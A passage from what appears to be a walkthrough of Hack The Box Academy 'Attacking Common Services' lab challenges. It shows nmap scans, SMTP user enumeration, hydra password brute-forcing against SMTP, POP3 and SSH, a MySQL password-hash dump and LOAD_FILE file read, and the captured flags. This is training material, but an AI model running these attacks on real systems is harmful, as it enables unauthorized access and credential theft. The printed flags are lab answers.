</span></span><span class=line><span class=cl>3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
</span></span><span class=line><span class=cl><span class=p>|</span> mysql-info:
</span></span><span class=line><span class=cl><span class=p>|</span>   Protocol: <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Version: 5.5.5-10.4.24-MariaDB
</span></span><span class=line><span class=cl><span class=p>|</span>   Thread ID: <span class=m>11</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Capabilities flags: <span class=m>63486</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Some Capabilities: DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, LongColumnFlag, FoundRows, InteractiveClient, SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
</span></span><span class=line><span class=cl><span class=p>|</span>_  Auth Plugin Name: mysql_native_password
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info:
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2024-02-23T15:28:23+00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2024-02-23T15:28:31+00:00<span class=p>;</span> +1s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>WIN-EASY
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-02-22T15:27:20
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-08-23T15:27:20
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>OS fingerprint not ideal because: Timing level <span class=m>5</span> <span class=o>(</span>Insane<span class=o>)</span> used
</span></span><span class=line><span class=cl>No OS matches <span class=k>for</span> host
</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
</span></span><span class=line><span class=cl>Service Info: Host: WIN-EASY<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE <span class=o>(</span>using port 25/tcp<span class=o>)</span>
</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
</span></span><span class=line><span class=cl><span class=m>1</span>   7.99 ms 10.10.14.1
</span></span><span class=line><span class=cl><span class=m>2</span>   7.29 ms 10.129.203.7
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 39.96 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.187<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-ckpvnzbf3p<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.220.215
</span></span><span class=line><span class=cl>fiona@inlanefreight.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.187<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-ckpvnzbf3p<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ hydra -l <span class=s2>&#34;fiona@inlanefreight.htb&#34;</span> -P /usr/share/wordlists/rockyou.txt smtp://10.129.220.215 -f -t64
</span></span><span class=line><span class=cl><span class=o>[</span>25<span class=o>][</span>smtp<span class=o>]</span> host: 10.129.45.212   login: fiona@inlanefreight.htb   password: <span class=m>987654321</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.187<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-ckpvnzbf3p<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mysql -u fiona -p987654321 -h 10.129.220.215
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>mysql<span class=o>]</span>&gt; <span class=k>select</span> user,password from user<span class=p>;</span>
</span></span><span class=line><span class=cl>+-------+-------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> User  <span class=p>|</span> Password                                  <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------+-------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> root  <span class=p>|</span>                                           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> fiona <span class=p>|</span> *DABCF719388B72AD432DE5E88423B56D652DD8B0 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> root  <span class=p>|</span>                                           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> root  <span class=p>|</span>                                           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> pma   <span class=p>|</span>                                           <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------+-------------------------------------------+
</span></span><span class=line><span class=cl><span class=m>5</span> rows in <span class=nb>set</span> <span class=o>(</span>0.004 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>mysql<span class=o>]</span>&gt; <span class=k>select</span> LOAD_FILE<span class=o>(</span><span class=s1>&#39;c://users/administrator/desktop/flag.txt&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>+-------------------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> LOAD_FILE<span class=o>(</span><span class=s1>&#39;c://users/administrator/desktop/flag.txt&#39;</span><span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------------------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> HTB<span class=o>{</span>t#3r3_4r3_tw0_w4y<span class=nv>$_t0_93t_t</span><span class=c1>#3_fl49}               |</span>
</span></span><span class=line><span class=cl>+-------------------------------------------------------+
</span></span><span class=line><span class=cl><span class=m>1</span> row in <span class=nb>set</span> <span class=o>(</span>0.087 sec<span class=o>)</span>
</span></span></code></pre></div><p><strong>flag:</strong> <code>HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}</code></p><h3 id=attacking-common-services---medium>Attacking Common Services - Medium<a hidden class=anchor aria-hidden=true href=#attacking-common-services---medium>#</a></h3><p>Host: 10.129.88.133</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~/Sublist3r/subbrute<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -sC -sV 10.129.88.133 -p-
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-01 14:02 GMT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.88.133
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.037s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>64964</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>, <span class=m>565</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 7108b0c4f3ca9757649770f9fec50c7b <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 45c3b51463993d9eb32251e59776e150 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 2ec2416646efb68195d5aa3523945538 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>53/tcp    open  domain   ISC BIND 9.16.1 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid:
</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class=line><span class=cl>110/tcp   open  pop3     Dovecot pop3d
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_pop3-capabilities: PIPELINING STLS RESP-CODES CAPA AUTH-RESP-CODE UIDL TOP USER SASL<span class=o>(</span>PLAIN<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>ubuntu
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:ubuntu
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-04-11T16:38:55
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2032-04-08T16:38:55
</span></span><span class=line><span class=cl>995/tcp   open  ssl/pop3 Dovecot pop3d
</span></span><span class=line><span class=cl><span class=p>|</span>_pop3-capabilities: PIPELINING CAPA AUTH-RESP-CODE RESP-CODES UIDL TOP USER SASL<span class=o>(</span>PLAIN<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>ubuntu
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:ubuntu
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-04-11T16:38:55
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2032-04-08T16:38:55
</span></span><span class=line><span class=cl>2121/tcp  open  ftp
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines:
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=m>220</span> ProFTPD Server <span class=o>(</span>InlaneFTP<span class=o>)</span> <span class=o>[</span>10.129.88.133<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid command: try being more creative
</span></span><span class=line><span class=cl><span class=p>|</span>_    Invalid command: try being more creative
</span></span><span class=line><span class=cl>30021/tcp open  ftp
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines:
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=m>220</span> ProFTPD Server <span class=o>(</span>Internal FTP<span class=o>)</span> <span class=o>[</span>10.129.88.133<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid command: try being more creative
</span></span><span class=line><span class=cl><span class=p>|</span>_    Invalid command: try being more creative
</span></span><span class=line><span class=cl><span class=m>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
</span></span><span class=line><span class=cl>SF-Port2121-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>3/1%Time<span class=o>=</span>65E1E035%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Gen
</span></span><span class=line><span class=cl>SF:ericLines,8C,<span class=s2>&#34;220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.8
</span></span></span><span class=line><span class=cl><span class=s2>SF:8\.133\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
</span></span></span><span class=line><span class=cl><span class=s2>SF:ive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r
</span></span></span><span class=line><span class=cl><span class=s2>SF:\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
</span></span><span class=line><span class=cl>SF-Port30021-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>3/1%Time<span class=o>=</span>65E1E035%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Ge
</span></span><span class=line><span class=cl>SF:nericLines,8F,<span class=s2>&#34;220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[10\
</span></span></span><span class=line><span class=cl><span class=s2>SF:.129\.88\.133\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
</span></span></span><span class=line><span class=cl><span class=s2>SF:ative\r\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 153.29 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~/Sublist3r/subbrute<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ftp 10.129.88.133 <span class=m>30021</span>
</span></span><span class=line><span class=cl>Connected to 10.129.88.133.
</span></span><span class=line><span class=cl><span class=m>220</span> ProFTPD Server <span class=o>(</span>Internal FTP<span class=o>)</span> <span class=o>[</span>10.129.88.133<span class=o>]</span>
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.129.88.133:root<span class=o>)</span>: anonymous
</span></span><span class=line><span class=cl><span class=m>331</span> Anonymous login ok, send your <span class=nb>complete</span> email address as your password
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>230</span> Anonymous access granted, restrictions apply
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful
</span></span><span class=line><span class=cl><span class=m>150</span> Opening ASCII mode data connection <span class=k>for</span> file list
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> ftp      ftp          <span class=m>4096</span> Apr <span class=m>18</span>  <span class=m>2022</span> simon
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer <span class=nb>complete</span>
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> simon
</span></span><span class=line><span class=cl><span class=m>250</span> CWD <span class=nb>command</span> successful
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful
</span></span><span class=line><span class=cl><span class=m>150</span> Opening ASCII mode data connection <span class=k>for</span> file list
</span></span><span class=line><span class=cl>-rw-rw-r--   <span class=m>1</span> ftp      ftp           <span class=m>153</span> Apr <span class=m>18</span>  <span class=m>2022</span> mynotes.txt
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer <span class=nb>complete</span>
</span></span><span class=line><span class=cl>ftp&gt; get mynotes.txt
</span></span><span class=line><span class=cl>local: mynotes.txt remote: mynotes.txt
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> mynotes.txt <span class=o>(</span><span class=m>153</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer <span class=nb>complete</span>
</span></span><span class=line><span class=cl><span class=m>153</span> bytes received in 0.02 secs <span class=o>(</span>7.6804 kB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~/Sublist3r/subbrute<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat mynotes.txt
</span></span><span class=line><span class=cl><span class=m>234987123948729384293</span>
</span></span><span class=line><span class=cl>+23358093845098
</span></span><span class=line><span class=cl>ThatsMyBigDog
</span></span><span class=line><span class=cl>Rock!ng#May
</span></span><span class=line><span class=cl>Puuuuuh7823328
</span></span><span class=line><span class=cl>8Ns8j1b!23hs4921smHzwn
</span></span><span class=line><span class=cl>237oHs71ohls18H127!!9skaP
</span></span><span class=line><span class=cl>238u1xjn1923nZGSb261Bs81
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ hydra pop3://10.129.88.133 -l simon -P mynotes.txt
</span></span><span class=line><span class=cl>Hydra v9.1 <span class=o>(</span>c<span class=o>)</span> <span class=m>2020</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2024-03-01 14:48:16
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>8</span> tasks per <span class=m>1</span> server, overall <span class=m>8</span> tasks, <span class=m>8</span> login tries <span class=o>(</span>l:1/p:8<span class=o>)</span>, ~1 try per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking pop3://10.129.88.133:110/
</span></span><span class=line><span class=cl><span class=o>[</span>110<span class=o>][</span>pop3<span class=o>]</span> host: 10.129.88.133   login: simon   password: 8Ns8j1b!23hs4921smHzwn
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2024-03-01 14:48:21
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ hydra ssh://10.129.88.133 -l simon -P mynotes.txt
</span></span><span class=line><span class=cl>Hydra v9.1 <span class=o>(</span>c<span class=o>)</span> <span class=m>2020</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2024-03-01 14:48:46
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class=m>4</span>
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>8</span> tasks per <span class=m>1</span> server, overall <span class=m>8</span> tasks, <span class=m>8</span> login tries <span class=o>(</span>l:1/p:8<span class=o>)</span>, ~1 try per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.129.88.133:22/
</span></span><span class=line><span class=cl><span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.129.88.133   login: simon   password: 8Ns8j1b!23hs4921smHzwn
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2024-03-01 14:48:49
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ssh simon@10.129.88.133
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.129.88.133 (10.129.88.133)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.129.88.133<span class=s1>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>simon@10.129.88.133&#39;</span>s password:
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.4 LTS <span class=o>(</span>GNU/Linux 5.4.0-107-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Fri <span class=m>01</span> Mar <span class=m>2024</span> 02:49:16 PM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.47               Processes:               <span class=m>232</span>
</span></span><span class=line><span class=cl>  Usage of /:   16.7% of 13.72GB   Users logged in:         <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 12%                IPv4 address <span class=k>for</span> ens160: 10.129.88.133
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Super-optimized <span class=k>for</span> small spaces - <span class=nb>read</span> how we shrank the memory
</span></span><span class=line><span class=cl>   footprint of MicroK8s to make it the smallest full K8s around.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   https://ubuntu.com/blog/microk8s-memory-optimisation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>No mail.
</span></span><span class=line><span class=cl>Last login: Wed Apr <span class=m>20</span> 14:32:33 <span class=m>2022</span> from 10.10.14.20
</span></span><span class=line><span class=cl>simon@lin-medium:~$ ls
</span></span><span class=line><span class=cl>Maildir  flag.txt
</span></span><span class=line><span class=cl>simon@lin-medium:~$ cat flag.txt
</span></span><span class=line><span class=cl>HTB<span class=o>{</span>1qay2wsx3EDC4rfv_M3D1UM<span class=o>}</span>
</span></span><span class=line><span class=cl>simon@lin-medium:~$
</span></span></code></pre></div><p><strong>flag:</strong> <code>HTB{1qay2wsx3EDC4rfv_M3D1UM}</code></p><h3 id=attacking-common-services---hard>Attacking Common Services - Hard<a hidden class=anchor aria-hidden=true href=#attacking-common-services---hard>#</a></h3><p>Host: 10.129.203.10</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~/Sublist3r/subbrute<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -A -T5 10.129.203.10
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-01 15:00 GMT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.203.10
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0058s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>1433/tcp open  ms-sql-s      Microsoft SQL Server <span class=m>2019</span> 15.00.2000.00<span class=p>;</span> RTM
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>SSL_Self_Signed_Fallback
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-03-01T14:59:09
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2054-03-01T14:59:09
</span></span><span class=line><span class=cl><span class=p>|</span> ms-sql-ntlm-info:
</span></span><span class=line><span class=cl><span class=p>|</span>   10.129.203.10:1433:
</span></span><span class=line><span class=cl><span class=p>|</span>     Target_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>     NetBIOS_Domain_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>     NetBIOS_Computer_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>     DNS_Domain_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>     DNS_Computer_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>_    Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span> ms-sql-info:
</span></span><span class=line><span class=cl><span class=p>|</span>   10.129.203.10:1433:
</span></span><span class=line><span class=cl><span class=p>|</span>     Version:
</span></span><span class=line><span class=cl><span class=p>|</span>       name: Microsoft SQL Server <span class=m>2019</span> RTM
</span></span><span class=line><span class=cl><span class=p>|</span>       number: 15.00.2000.00
</span></span><span class=line><span class=cl><span class=p>|</span>       Product: Microsoft SQL Server <span class=m>2019</span>
</span></span><span class=line><span class=cl><span class=p>|</span>       Service pack level: RTM
</span></span><span class=line><span class=cl><span class=p>|</span>       Post-SP patches applied: <span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    TCP port: <span class=m>1433</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2024-03-01T15:01:24+00:00<span class=p>;</span> 0s from scanner time.
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>WIN-HARD
